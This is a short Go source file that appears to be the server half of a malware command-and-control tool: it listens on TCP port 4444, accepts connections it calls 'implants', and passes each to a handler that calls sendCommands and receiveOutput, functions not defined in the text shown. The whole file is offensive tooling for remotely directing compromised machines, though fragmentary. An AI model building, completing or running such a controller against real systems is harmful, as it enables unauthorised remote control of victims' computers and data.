package main

import (
	"fmt"
	"log"
	"net"
)

func initalizeServer() {
	listen, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal("[-] Error", err)
	}

	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println(" [-] Error accepting connection")
			continue
		}

		fmt.Println("Implant connected: ", conn.RemoteAddr())
		go handleImplants(conn)
	}
}

func handleImplants(conn net.Conn) {
	defer conn.Close()
	sendCommands(conn)
	receiveOutput(conn)
}
